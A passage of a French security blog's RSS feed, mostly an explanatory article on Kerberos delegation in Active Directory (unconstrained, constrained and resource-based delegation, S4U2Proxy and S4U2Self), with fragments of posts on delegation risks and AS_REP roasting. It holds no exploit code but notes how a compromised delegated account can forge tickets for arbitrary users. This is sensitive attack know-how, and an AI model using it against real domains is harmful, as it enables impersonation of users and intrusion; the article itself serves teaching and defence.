&lt;p&gt;Si l’option est activée pour ce compte, alors le contrôleur de domaine saura qu’aucun service n’aura le droit de relayer les informations d’authentification de cet utilisateur. Ainsi, concernant la délégation complète, le contrôleur de domaine ne vas pas inclure une copie du TGT lors de la demande de TGS.&lt;/p&gt;

&lt;p&gt;Il y aura toujours un événement 4624 sur le serveur, mais aucune copie de TGT ne sera disponible.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/04/no_ticket.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/04/no_ticket.png&quot; alt=&quot;DCSync&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;J’espère que cet article vous a plu, si vous avez des remarques ou des questions, n’hésitez pas à les poser ici ou sur &lt;a href=&quot;https://discord.gg/9At6SUZ&quot; target=&quot;blank&quot;&gt;Discord&lt;/a&gt;. Vous pouvez toujours suivre la sortie de nouveaux articles sur mon twitter &lt;a href=&quot;https://twitter.com/HackAndDo&quot; target=&quot;blank&quot;&gt;@hackanddo&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Fri, 12 Apr 2019 13:28:42 +0200</pubDate>
        <link>http://localhost:4000//unconstrained-delegation-attack/</link>
        <guid isPermaLink="true">http://localhost:4000//unconstrained-delegation-attack/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>Délégation Kerberos - Fonctionnement</title>
        <description>&lt;p&gt;Au sein d’un Active Directory, des services peuvent être utilisés par des utilisateurs. Il arrive parfois que ces services doivent en contacter d’autres, au nom de l’utilisateur, comme un service web pourrait avoir besoin de contacter un serveur de fichiers. Afin d’autoriser un service à accéder à un autre service &lt;strong&gt;au nom de l’utilisateur&lt;/strong&gt;, une solution a été mise en place (introduite à partir de Windows Server 2000) pour répondre à ce besoin : &lt;strong&gt;La délégation Kerberos.&lt;/strong&gt;&lt;/p&gt;

&lt;!--more--&gt;

&lt;h2 id=&quot;principe-de-la-délégation&quot;&gt;Principe de la délégation&lt;/h2&gt;

&lt;p&gt;Pour comprendre le principe de la délégation Kerberos, prenons un exemple concret. Une machine héberge un service Web qui, via une jolie interface, permet à un utilisateur d’accéder à son dossier personnel, hébergé sur un serveur de fichiers. Nous sommes donc dans la situation suivante :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/webfsuser.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/webfsuser.png&quot; alt=&quot;Etat actuel&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Le serveur Web est en frontal, et c’est lui qui va chercher les informations à la place de l’utilisateur sur le serveur de fichiers afin d’afficher le contenu d’un dossier, par exemple.&lt;/p&gt;

&lt;p&gt;Cependant, le serveur web ne sait pas ce qui appartient à l’utilisateur sur le serveur de fichiers. Ce n’est pas son rôle à lui de décortiquer le &lt;a href=&quot;/kerberos-silver-golden-tickets/#pac&quot;&gt;PAC&lt;/a&gt; de l’utilisateur pour faire une demande spécifique au serveur de fichiers. C’est là qu’entre en jeu la &lt;strong&gt;délégation&lt;/strong&gt;. Ce mécanisme permet au serveur web de prendre la place de l’utilisateur, et de s’authentifier au nom de celui-ci auprès du serveur de fichiers. Ainsi, du point de vue du serveur de fichiers, c’est l’utilisateur qui fait la demande, et le serveur de fichiers va pouvoir vérifier les droits de cet utilisateur, puis renvoyer les informations auxquelles ce compte a accès. C’est de cette manière que le serveur web peut ensuite afficher ces informations dans une jolie interface.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/impersonation.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/impersonation.png&quot; alt=&quot;Impersonation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;constrained--unconstrained-delegation&quot;&gt;Constrained &amp;amp; Unconstrained Delegation&lt;/h2&gt;

&lt;p&gt;La possibilité de relayer des identifiants peut être donnée à une machine ou un utilisateur de service, c’est à dire qui possède au moins un attibut &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Il existe aujourd’hui trois manières d’autoriser une machine ou un compte de service de prendre la place d’un utilisateur pour communiquer avec un ou plusieurs autre(s) service(s) : La &lt;strong&gt;Unconstrained Delegation&lt;/strong&gt;, la &lt;strong&gt;Constrained Delegation&lt;/strong&gt; et la &lt;strong&gt;Resource Based Constrained Delegation&lt;/strong&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kerberos-unconstrained-delegation---kud&quot;&gt;Kerberos Unconstrained Delegation - KUD&lt;/h3&gt;

&lt;p&gt;Dans le cas d’une &lt;strong&gt;Unconstrained Delegation&lt;/strong&gt; (KUD), le serveur ou le compte de service qui se voit attribuer ce droit est en mesure de se faire passer pour l’utilisateur pour communiquer avec &lt;strong&gt;n’importe quel service&lt;/strong&gt; sur &lt;strong&gt;n’importe quelle machine&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;C’est historiquement le seul choix qu’il y avait lors de l’instauration du principe de délégation, mais il a été complété par le principe de la &lt;strong&gt;Constrained Delegation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/unconstrained_delegation_schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/unconstrained_delegation_schema.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Voici un exemple, dans mon lab, d’une machine qui est en &lt;strong&gt;Unconstrained Delegation&lt;/strong&gt; :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/unconstrained_delegation.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/unconstrained_delegation.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;kerberos-constrained-delegation---kcd&quot;&gt;Kerberos Constrained Delegation - KCD&lt;/h3&gt;

&lt;p&gt;Si une machine ou un compte de service possède le flag &lt;strong&gt;Constrained Delegation&lt;/strong&gt; (KCD), alors une liste de services autorisés sera associée à ce droit. Par exemple, dans le cas du serveur web de l’introduction, la machine hébergeant le serveur web aura le drapeau &lt;strong&gt;KCD&lt;/strong&gt; avec comme précision que ce serveur ne peut relayer les informations de l’utilisateur qu’au service &lt;code class=&quot;highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; du serveur &lt;code class=&quot;highlighter-rouge&quot;&gt;SERVEUR01&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/constrained_delegation_schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/constrained_delegation_schema.png&quot; alt=&quot;Constrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;C’est donc le serveur relayant les informations de l’utilisateur qui possède l’information des services (&lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt;) autorisés.&lt;/p&gt;

&lt;p&gt;En d’autres termes, le serveur en frontal va dire “je suis autorisé à m’authentifier en tant que l’utilisateur auprès de cette liste de &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; : […]”.&lt;/p&gt;

&lt;p&gt;Dans mon lab, le serveur web est &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt; et celui qui possède le partage de fichiers est &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-02&lt;/code&gt;. Voici donc à quoi ressemble la liste des services pour lesquels &lt;code class=&quot;highlighter-rouge&quot;&gt;WEB-SERVER-01&lt;/code&gt; peut se faire passer pour l’utilisateur :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/delegation_cifs.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/delegation_cifs.png&quot; alt=&quot;Delegation CIFS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&amp;lt;note&amp;gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;De ma compréhension, le statut délégation ne peut être appliqué qu’à une machine ou un utilisateur de service (i.e. ayant au moins un attribut &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt;).&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Dans le premier cas (Machine), cela implique que &lt;strong&gt;tous&lt;/strong&gt; les services hébergés sur la machine peuvent relayer les informations de l’utilisateur.&lt;/li&gt;
  &lt;li&gt;Dans le deuxième cas (compte de service), cela veut dire que quel que soit le serveur sur lequel tournent les services exécutés par ce compte de service, ils – ces services – auront tous la possibilité de délégation.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Je trouve ce comportement étonnant, j’aurais pensé qu’il était possible de décider que seul un service précis sur une machine précise pouvait relayer les informations de l’utilisateur, mais il me semble, en l’état, que cette granularité n’existe pas.&lt;/p&gt;

&lt;p&gt;Si ma compréhension est incorrecte, n’hésitez pas à me le remonter dans les commentaires ou sur &lt;a href=&quot;https://twitter.com/HackAndDo&quot;&gt;twitter&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&amp;lt;/note&amp;gt;&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;resource-based-kerberos-constrained-delegation---rbkcd&quot;&gt;Resource Based Kerberos Constrained Delegation - RBKCD&lt;/h3&gt;

&lt;p&gt;Enfin, nous avons le cas de la &lt;strong&gt;Resource Based Constrained Delegation&lt;/strong&gt; (RBKCD). Apparue avec Windows Server 2012, cette solution permet de palier à quelques problèmes liés à la &lt;strong&gt;KCD&lt;/strong&gt; (Responsabilité, délégation inter-domaines, …). Sans trop aller dans les détails, la responsabilité de la délégation est déplacée. Alors que dans &lt;strong&gt;KCD&lt;/strong&gt;, c’est au niveau du serveur qui délègue qu’on indique les &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; autorisés, dans le cas du &lt;strong&gt;RBKCD&lt;/strong&gt;, c’est au niveau des services finaux qu’on indique la liste des services qui peuvent communiquer avec eux via délégation. Ainsi, le schéma est le suivant :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema.png&quot; alt=&quot;Resource Based Constrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;La responsabilité est déplacée, c’est au niveau du serveur qui reçoit les connexions avec délégation que se trouve l’information de si oui ou non cette délégation est acceptée.&lt;/p&gt;

&lt;p&gt;En d’autres termes, c’est le service final qui dit “j’autorise cette liste de compte […] à s’authentifier chez moi au nom d’un utilisateur”.&lt;/p&gt;

&lt;h2 id=&quot;détails-techniques&quot;&gt;Détails techniques&lt;/h2&gt;

&lt;p&gt;Maintenant que le principe est compris (du moins je l’espère), nous allons détailler un peu ce process. Concrètement, comment est-ce qu’une machine ou un compte peut se faire passer pour un utilisateur auprès d’un service ? C’est ce que nous allons voir maintenant. Les détails entre les différentes techniques sont relativement différents, c’est pourquoi chacune d’entre elle sera expliquée séparemment. Accrochez vous, &lt;em&gt;it’s gonna get dirty&lt;/em&gt;.&lt;/p&gt;

&lt;h3 id=&quot;kerberos-unconstrained-delegation---kud-1&quot;&gt;Kerberos Unconstrained Delegation - KUD&lt;/h3&gt;

&lt;p&gt;Comme nous l’avons vu, dans ce cas, le serveur ou le compte de service peut s’authentifier au nom de l’utilisateur auprès de n’importe quel autre service. Pour que cela soit possible, il faut deux prérequis :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Le premier est que le compte qui veut déléguer une authentification possède le drapeau &lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_TRUSTED_FOR_DELEGATION&lt;/code&gt; présent dans &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/iads/ne-iads-ads_user_flag&quot;&gt;ADS_USER_FLAG_ENUM&lt;/a&gt;. Pour pouvoir changer cette information, il faut avoir le droit &lt;code class=&quot;highlighter-rouge&quot;&gt;SeEnableDelegationPrivilege&lt;/code&gt; qui est la plupart du temps seulement existant pour les administrateurs de domaine. Voici comment ce drapeau est placé sur le compte (machine ou compte de service):&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/unconstrained_delegation.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/unconstrained_delegation.png&quot; alt=&quot;Unconstrained Delegation&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Le deuxième est que le compte utilisateur qui va être relayé soit effectivement “relayable”. Pour cela, il &lt;strong&gt;ne faut pas&lt;/strong&gt; faut que le drapeau &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/iads/ne-iads-ads_user_flag&quot;&gt;ADS_UF_NOT_DELEGATED&lt;/a&gt; soit positionné. Par défaut, aucun compte de l’AD n’a ce drapeau de positionné, ils sont donc tous “relayables”.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Concrètement, lors des échanges avec le contrôleur de domaine tels que décrits dans l’article &lt;a href=&quot;/kerberos&quot;&gt;Kerberos en Active Directory&lt;/a&gt;, lorsque l’utilisateur fait une demande de TGS (&lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_TGS_REQ&lt;/a&gt;), il précisera le &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; du service qu’il souhaite consommer. C’est à ce moment que le contrôleur de domaine va chercher les deux prérequis :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Est-ce que le drapeau &lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_TRUSTED_FOR_DELEGATION&lt;/code&gt; est positionné dans les attributs du compte associé au &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;Est-ce que le drapeau &lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_NOT_DELEGATED&lt;/code&gt; n’est &lt;strong&gt;pas&lt;/strong&gt; positionné pour l’utilisateur qui fait la demande&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si les deux prérequis sont vérifiés, alors le contrôleur de domaine va répondre à l’utilisateur avec un &lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_TGS_REQ&lt;/a&gt; contenant les informations classiques, mais il va également intégrer dans sa réponse &lt;strong&gt;une copie du TGT&lt;/strong&gt; de l’utilisateur, ainsi qu’une nouvelle clé de session associée.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/cop_tgt.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/cop_tgt.png&quot; alt=&quot;TGT Copy&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Une fois en possession de ces éléments, l’utilisateur va continuer le processus classique en envoyant une requête auprès du service (&lt;a href=&quot;/kerberos/#krb_ap_req&quot;&gt;KRB_AP_REQ&lt;/a&gt;) en lui envoyant le TGS et un authentifiant. Le service va être en mesure de déchiffrer le contenu du TGS, vérifier l’identité de l’utilisateur en déchiffrant l’authentifiant, mais surtout il va pouvoir récupérer la copie du TGT ainsi que la clé de session associée pour, ensuite, se faire passer pour l’utilisateur auprès du contrôleur de domaine.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/tgt_memory.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/tgt_memory.png&quot; alt=&quot;TGT Memory&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;En effet, maintenant en possession d’une copie du TGT de l’utilisateur ainsi que d’une clé de session valide, le service peut s’authentifier auprès de n’importe quel autre service au nom de l’utilisateur en faisant une demande de TGS au contrôleur de domaine, en lui fournissant ce TGT et en chiffrant un authentifiant avec la clé de session. C’est le principe de la &lt;strong&gt;Unconstrained Delegation&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Voici un schéma récapitulatif :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/unconstrained_delegation_detailed.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/unconstrained_delegation_detailed.png&quot; alt=&quot;Unconstrained Delegation Detailed&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;kerberos-constrained-delegation&quot;&gt;Kerberos Constrained Delegation&lt;/h3&gt;

&lt;p&gt;Pour la &lt;strong&gt;Constrained Delegation&lt;/strong&gt;, une liste de &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; ou de comptes autorisés sera fournie pour indiquer les services/comptes acceptés pour la délégation. De ce fait, le processus n’est pas le même. Le service concerné ne sera pas en possession du TGT de l’utilisateur, sinon il n’y a aucun moyen de contrôler les authentifications du service. Un mécanisme différent est utilisé.&lt;/p&gt;

&lt;p&gt;Mettons nous dans le cas où l’utilisateur s’authentifie auprès du &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; puis que ce &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; doit s’authentifier auprès du &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt; en tant que l’utilisateur.&lt;/p&gt;

&lt;p&gt;L’utilisateur fait une requête de TGS, puis l’envoie au &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt;. Ce service devant s’authentifier en tant que l’utilisateur auprès de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt;, il va demander un TGS au KDC au nom de l’utilisateur. Cette demande est régie par l’extension &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/bde93b0e-f3c9-4ddf-9f44-e1453be7af5a&quot;&gt;S4U2Proxy&lt;/a&gt;. Pour indiquer au contrôleur de domaine qu’il veut s’authentifier au nom de quelqu’un d’autre, deux attributs seront définis dans la demande de ticket &lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_TGS_REQ&lt;/a&gt; :&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;le champ &lt;code class=&quot;highlighter-rouge&quot;&gt;additional-tickets&lt;/code&gt;, d’habitude vide, doit cette fois contenir le TGS de l’utilisateur en question (sous condition que le drapeau &lt;code class=&quot;highlighter-rouge&quot;&gt;ADS_UF_NOT_DELEGATED&lt;/code&gt; ne soit &lt;strong&gt;pas&lt;/strong&gt; positionné pour l’utilisateur qui fait la demande. Si c’était le cas, le TGS de l’utilisateur ne serait pas &lt;code class=&quot;highlighter-rouge&quot;&gt;forwardable&lt;/code&gt;, et le contrôleur de domaine ne l’accepterait pas dans la suite du processus)&lt;/li&gt;
  &lt;li&gt;Le drapeau &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/17b9af82-d45a-437d-a05c-79547fe969f5&quot;&gt;cname-in-addl-tkt&lt;/a&gt;, qui doit être positionné pour indiquer au DC qu’il ne doit pas utiliser les informations du serveur, mais celle du ticket présent dans &lt;code class=&quot;highlighter-rouge&quot;&gt;additional-tickets&lt;/code&gt;, c’est à dire les informations de l’utilisateur pour lequel le service veut se faire passer.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;C’est lors de cette demande que le contrôleur de domaine, en voyant ces informations, va vérifier que &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; a le droit de s’authentifier auprès de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt; au nom de l’utilisateur.&lt;/p&gt;

&lt;h4 id=&quot;constrained-delegation---classique&quot;&gt;Constrained Delegation - Classique&lt;/h4&gt;

&lt;p&gt;Dans le cas classique de &lt;strong&gt;Constrained Delegation&lt;/strong&gt; (donc quand l’information est située au niveau de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt;), cette information est présente dans l’attribut &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/86261ca1-154c-41fb-8e5f-c6446e77daaa&quot;&gt;msDS-AllowedToDelegateTo&lt;/a&gt; &lt;strong&gt;de l’objet (compte) demandeur&lt;/strong&gt;, donc de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt;, attribut qui spécifie la liste des &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; autorisés pour la délégation. Par exemple ici l’attribut &lt;code class=&quot;highlighter-rouge&quot;&gt;msDS-AllowedToDelegateTo&lt;/code&gt; contiendra &lt;code class=&quot;highlighter-rouge&quot;&gt;cifs/WEB-SERVER-02&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/delegation_cifs.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/delegation_cifs.png&quot; alt=&quot;Delegation CIFS&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Si le &lt;a href=&quot;/service-principal-name-spn&quot;&gt;SPN&lt;/a&gt; cible est bien présent, alors le KDC renvoie un TGS valide, avec le nom de l’utilisateur, pour le service demandé. Voici un schéma récapitulatif :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/constrained_delegation_schema_detailed.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/constrained_delegation_schema_detailed.png&quot; alt=&quot;Constrained Delegation Detailed&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4 id=&quot;constrained-delegation---resource-based&quot;&gt;Constrained Delegation - Resource Based&lt;/h4&gt;

&lt;p&gt;Le KDC va cette fois aller voir les attributs de &lt;strong&gt;Service B&lt;/strong&gt; (et non plus de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt;). Il va vérifier que le compte associé à &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; est bien présent dans l’attribut &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-ada2/cea4ac11-a4b2-4f2d-84cc-aebb4a4ad405&quot;&gt;msDS-AllowedToActOnBehalfOfOtherIdentity&lt;/a&gt; du compte lié à &lt;code class=&quot;highlighter-rouge&quot;&gt;Service B&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema_detailed.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/resource_based_constrained_delegation_schema_detailed.png&quot; alt=&quot;Resource Based Constrained Delegation Detailed&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Comme le montre le schéma, le fonctionnement technique est similaire, cependant les responsabilités de chaques entités sont radicalement différentes.&lt;/p&gt;

&lt;h3 id=&quot;extension-s4u2self&quot;&gt;Extension S4U2Self&lt;/h3&gt;

&lt;p&gt;Si vous êtes encore là et que vous avez bien suivi, vous aurez remarqué que nous n’avons pas abordé dans cet article la notion de transition de protocole. En effet, dans ce qui a été expliqué concernant la délégation contrainte, nous partions du principe que le &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; était en possession d’un ticket de service provenant de &lt;code class=&quot;highlighter-rouge&quot;&gt;USER&lt;/code&gt;, ticket qui était ajouté dans le champ &lt;code class=&quot;highlighter-rouge&quot;&gt;additional-tickets&lt;/code&gt; de la demande de TGS (&lt;strong&gt;S4U2Proxy&lt;/strong&gt;). Mais il arrive que l’utilisateur s’authentifie auprès du serveur d’une autre manière que via le protocole Kerberos (par exemple via NTLM, ou même un formulaire web). Dans ce cas, le serveur n’est pas en possession d’un TGS envoyé par l’utilisateur. Ainsi, &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; ne peut pas, en l’état, remplir le champ &lt;code class=&quot;highlighter-rouge&quot;&gt;additional-tickets&lt;/code&gt; comme il le faisait dans les cas précédemment décrits.&lt;/p&gt;

&lt;p&gt;C’est pourquoi il y a une étape supplémentaire, possible grâce à l’extension &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13&quot;&gt;S4U2Self&lt;/a&gt;, que &lt;code class=&quot;highlighter-rouge&quot;&gt;Service A&lt;/code&gt; doit effectuer. Cette étape lui permet d’obtenir un TGS pour un utilisateur &lt;strong&gt;choisi arbitrairement&lt;/strong&gt;. Pour cela, il effectue une demande de TGS classique (&lt;a href=&quot;/kerberos/#krb_tgs_req&quot;&gt;KRB_TGS_REQ&lt;/a&gt;) sauf qu’au lieu de mettre son nom à lui dans le bloc &lt;code class=&quot;highlighter-rouge&quot;&gt;PA-FOR-USER&lt;/code&gt; (présent dans la partie préauthentification), il met le nom d’un utilisateur &lt;strong&gt;qu’il choisit&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Evidemment, on pourrait croire que c’est une capacité très puissante et dangereuse puisqu’en fait, pour tous services &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; et &lt;code class=&quot;highlighter-rouge&quot;&gt;T&lt;/code&gt; pour lesquels il y aurait une délégation possible de &lt;code class=&quot;highlighter-rouge&quot;&gt;S&lt;/code&gt; vers &lt;code class=&quot;highlighter-rouge&quot;&gt;T&lt;/code&gt;, le &lt;code class=&quot;highlighter-rouge&quot;&gt;Service S&lt;/code&gt; pourrait se faire passer pour n’importe quel utilisateur auprès de &lt;code class=&quot;highlighter-rouge&quot;&gt;Service T&lt;/code&gt;. Heureusement, ce n’est pas le cas. En effet, si le drapeau &lt;a href=&quot;https://docs.microsoft.com/en-us/windows/desktop/api/iads/ne-iads-ads_user_flag&quot;&gt;ADS_UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION&lt;/a&gt; n’est pas positionné sur l’objet associé au &lt;code class=&quot;highlighter-rouge&quot;&gt;Service S&lt;/code&gt;, alors le ticket qu’il récupèrera ne sera pas tranférable (&lt;em&gt;forwardable&lt;/em&gt;) et ne pourra donc pas être utilisé pour une délégation contrainte classique. Il existe un cas particulier pour la délégation Resource-Based, dont nous parlerons dans un autre article.&lt;/p&gt;

&lt;p&gt;Pour que le compte puisse avoir ce drapeau, il faut le préciser ici dans l’interface graphique :&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/s4u2self_gui.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/s4u2self_gui.png&quot; alt=&quot;Drapeau S4U2Self&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Attention, le schéma récapitulatif se complique, mais j’espère qu’il reste relativement clair.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;/assets/uploads/2019/02/s4u2self.png&quot;&gt;&lt;img src=&quot;/assets/uploads/2019/02/s4u2self.png&quot; alt=&quot;S4U2Self&quot; /&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;D’expérience, il est rare de trouver des comptes au sein d’un domaine qui possèdent ce drapeau. Si cependant un compte de ce type est compromis, alors tous les services auxquels ce compte est en droit de s’authentifier via délégation seront également compromis, puisque l’attaquant peut créer des tickets de service au nom d’utilisateurs arbitraires, notamment des utilisateurs administrateurs des services ciblés.&lt;/p&gt;

&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;

&lt;p&gt;Je pensais faire un article qui allait décrire le principe de Constrained et Unconstrained Delegation ainsi que les attaques associées, cependant les explications sont beaucoup plus denses que prévues, ainsi cet article reste consacré à l’explication. Les attaques associées seront présentées dans d’autres articles, que je citerai ici, au fil de leurs sorties.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;/unconstrained-delegation-attack&quot;&gt;Unconstrained Delegation - Risques&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Si vous avez des questions ou remarques, n’hésitez pas, je suis tout ouïe.&lt;/p&gt;

&lt;h2 id=&quot;ressources&quot;&gt;Ressources&lt;/h2&gt;

&lt;p&gt;Grands mercis à eux pour leurs explications claires.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/&quot;&gt;S4U2Pwnage - Harmj0y&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;http://adsecurity.org/&quot;&gt;ADSecurity - Pyrotek3&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://www.sstic.org/media/SSTIC2014/SSTIC-actes/secrets_dauthentification_pisode_ii__kerberos_cont/SSTIC2014-Article-secrets_dauthentification_pisode_ii__kerberos_contre-attaque-bordes_2.pdf&quot;&gt;Secrets d’authentification épisode II Kerberos contre-attaque - Aurélien Bordes&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html&quot;&gt;Wagging the dog - Edla Shamir&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
        <pubDate>Fri, 29 Mar 2019 13:17:22 +0100</pubDate>
        <link>http://localhost:4000//constrained-unconstrained-delegation/</link>
        <guid isPermaLink="true">http://localhost:4000//constrained-unconstrained-delegation/</guid>
        
        <category>Active Directory</category>
        
        <category>Windows</category>
        
        
      </item>
    
      <item>
        <title>AS_REP Roasting</title>
